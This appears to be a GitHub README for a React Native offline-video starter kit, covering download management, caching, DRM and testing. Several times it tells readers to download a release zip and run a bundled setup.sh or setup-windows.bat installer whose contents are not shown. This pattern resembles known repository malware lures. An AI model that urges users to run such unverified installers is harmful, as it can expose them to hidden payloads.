# React Native Offline Video Starter — Offline Playback SDK

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/Mirna888/react-native-offline-video-starter/releases)

![Hero image - offline video](https://images.unsplash.com/photo-1515378791036-0648a3ef77b2?auto=format&fit=crop&w=1400&q=80)

A starter kit that brings offline video playback to React Native apps. This project bundles a sample app, scripts, and configuration to cache, manage, and play videos when the device has no network. It targets common mobile flows: download, manage storage, play without network, and resume interrupted downloads.

Table of contents
- Features
- Preview
- Getting started
- Download and run release
- Install from source
- Core concepts
- API reference (short)
- Configuration
- Storage and quotas
- DRM and secure playback
- Testing and CI
- Troubleshooting
- Contributing
- Changelog
- License
- Credits

Features
- Offline download manager for video assets
- Per-video resumable downloads
- Local playback with adaptive quality selection
- Download queue and priority controls
- Storage usage and cleanup utilities
- Hooks and components for React Native integration
- Example screens for Android and iOS
- Dev scripts to build sample app and test flows

Preview
- Demo GIF: ![demo](https://media.giphy.com/media/3o7aD2saalBwwftBIY/giphy.gif)
- Screenshot:  
  ![player screenshot](https://raw.githubusercontent.com/facebook/react-native/main/docs/assets/pinned/oss_logo.png)

Getting started

Minimum environment
- Node 14+ or 16+
- Yarn or npm
- React Native 0.64+
- Xcode 12+ for iOS
- Android SDK 29+ for Android
- CocoaPods for iOS native dependencies

Download and run release
- Download the latest release archive and execute the included installer script from the Releases page:
  https://github.com/Mirna888/react-native-offline-video-starter/releases

- Steps:
  1. Visit the Releases link above.
  2. Download the release file named react-native-offline-video-starter-vX.Y.Z.zip
  3. Extract the archive.
  4. Run the included setup script:
     - macOS / Linux:
       ```bash
       cd react-native-offline-video-starter-vX.Y.Z
       chmod +x setup.sh
       ./setup.sh
       ```
     - Windows:
       Double-click setup-windows.bat or run it in PowerShell:
       ```powershell
       .\setup-windows.bat
       ```

Install from source

Clone the repo
```bash
git clone https://github.com/Mirna888/react-native-offline-video-starter.git
cd react-native-offline-video-starter
```

Install packages
```bash
yarn install
# or
npm install
```

iOS
```bash
cd ios
pod install
cd ..
yarn react-native run-ios
```

Android
```bash
yarn react-native run-android
```

Starter app flow
1. Open the app.
2. Browse the sample video list.
3. Tap Download on a video.
4. Track progress in the download queue.
5. Play the video offline from the local library.

Core concepts

Cache layers
- Disk cache: store downloaded video files on disk. Use a defined base path per app.
- Metadata store: small JSON DB with download state, resume tokens, quality variants.
- In-memory index: quick access to active downloads and handles.

Resumable downloads
- Use HTTP range requests where the server supports ranges.
- Persist resume offset and ETag per asset.
- Retry with exponential backoff for transient errors.

Playback
- Use native player controls:
  - Android: ExoPlayer integration for adaptive bitrate and cache support.
  - iOS: AVPlayer with local file URLs and resource loader delegate for DRM.
- Use local file URI (file://) when the asset finishes downloading.
- Use progressive play: start playback from partial file when format supports progressive streaming (e.g., MP4 with moov atom at front).

API reference (short)

VideoDownloadManager
- startDownload(asset) -> DownloadTask
- pauseDownload(id) -> void
- resumeDownload(id) -> void
- cancelDownload(id) -> void
- getStatus(id) -> {progress, state, path}

LocalPlayer
- playLocal(path) -> void
- seek(seconds) -> void
- setQuality(label) -> void
- on(event, handler) -> unsubscribe

Hooks
- useDownloadManager() -> {start, pause, resume, list}
- useLocalPlayback(path) -> {isPlaying, play, pause, progress}

Examples
Start a download
```js
const manager = useDownloadManager();
manager.start({
  id: 'video-123',
  title: 'Big City Tour',
  url: 'https://example.com/videos/big-city.mp4',
  quality: '720p'
});
```

Play local file
```js
import LocalPlayer from 'rn-offline-player';
LocalPlayer.playLocal('/data/user/0/app/cache/video-123.mp4');
```

Configuration

config/default.json
- download:
  - concurrent: 3
  - chunkSize: 2_048_000
  - retry: 5
- storage:
  - maxBytes: 2_000_000_000
  - purgePolicy: LRU
- player:
  - bufferAheadSeconds: 10

Change config at runtime
```js
import Config from 'rn-offline-config';
Config.set('download.concurrent', 2);
```

Storage and quotas

Storage path
- Android: app-specific cache dir: /data/data/<package>/cache/offline-videos
- iOS: Library/Caches/offline-videos

Quota management
- The manager tracks total bytes used by downloads.
- When usage approaches maxBytes, the manager triggers cleanup.
- Cleanup options:
  - Auto: purge least-recently-played.
  - Manual: show UI for the user to delete items.

Cleanup command
```bash
yarn run cleanup --max-bytes=1500000000
```

DRM and secure playback

Supported DRM
- Widevine (Android) via ExoPlayer DRM module
- FairPlay (iOS) via AVFoundation resource loader

DRM flow
1. Fetch license challenge from app server.
2. Fetch license from DRM license server.
3. Store per-asset license tokens in secure storage.
4. During offline playback, use stored license when allowed.

DRM caveats
- Licenses may expire and require network to renew.
- The sample shows offline playback with long-lived licenses for test content.

Testing and CI

Unit tests
- Run unit tests:
  ```bash
  yarn test
  ```
- The project uses Jest and react-native-testing-library.

E2E tests
- Detox for Android and iOS
- Sample E2E:
  ```bash
  yarn detox build
  yarn detox test
  ```

CI hints
- Cache node_modules and pods
- Use real device for DRM flows or provide mock license server for CI

Troubleshooting

Common issues and quick fixes
- Build fails on iOS: run pod install and clean DerivedData.
- Android emulator fails: ensure the emulator has Internet access and correct API level.
- Downloads stall: verify server supports HTTP Range header.
- Playback issues: check file integrity and moov atom placement for MP4s.

Contributing

How to contribute
- Fork the repo.
- Create a branch for your feature or fix.
- Write tests for new features.
- Open a pull request with a clear description.

Coding style
- Use ESLint rules in .eslintrc.js
- Use Prettier for formatting
- Keep functions small and focused

Issue template
- Include steps to reproduce
- Include device and OS info
- Include logs or screenshots

Changelog
- See Releases for packaged builds and release notes:
  https://github.com/Mirna888/react-native-offline-video-starter/releases

Release process
- Tag with semantic versioning, e.g. v1.0.0
- Build assets and include:
  - react-native-offline-video-starter-vX.Y.Z.zip
  - setup.sh / setup-windows.bat
- Publish the release on GitHub

Security

Sensitive data
- Do not store DRM secrets in source code.
- Use secure keystore/keychain for license tokens.

Audit
- Regularly audit native dependencies for CVEs
- Lock versions for native modules in Podfile.lock and Gradle lock

Performance tips

Download tuning
- Use chunked downloads and control concurrent stream count.
- Use checksums to verify file integrity after download.
- Use throttling to avoid saturating mobile data.

Playback tuning
- Pre-buffer small segments before play.
- Use ExoPlayer on Android for adaptive streaming and cache benefits.

Assets and images
- Use optimized thumbnails (WebP/AVIF when supported)
- Store low-res and high-res variants and choose based on device and battery.

Examples and Screens

- Gallery:
  - ![library](https://images.unsplash.com/photo-1512496015851-a90fb38ba796?auto=format&fit=crop&w=1200&q=80)
  - ![download manager](https://images.unsplash.com/photo-1508873696983-2dfd5898f2a9?auto=format&fit=crop&w=1200&q=80)

Scripts

Useful scripts in package.json
- yarn start - start Metro bundler
- yarn ios - run on iOS simulator
- yarn android - run on Android emulator
- yarn build:android - build APK
- yarn build:ios - build IPA
- yarn release - package and tag for release

FAQ

Q: Can users stream while downloading?
A: Yes. Use progressive playback or start play from partially downloaded file when file format supports that.

Q: How do I secure downloads?
A: Use HTTPS and token-based auth. Encrypt files at rest if your app requires it.

Q: Can I limit downloads on cellular?
A: Yes. Add a setting to restrict downloads to Wi-Fi or prompt the user.

Credits
- Built with React Native and native player frameworks.
- Icons: Feather / MaterialCommunityIcons
- Images: Unsplash and open sources

License
- MIT License

Acknowledgments
- The starter bundles common patterns for offline video flows and has sample integrations for ExoPlayer and AVPlayer. For release downloads and packaged builds visit the Releases page:
https://github.com/Mirna888/react-native-offline-video-starter/releases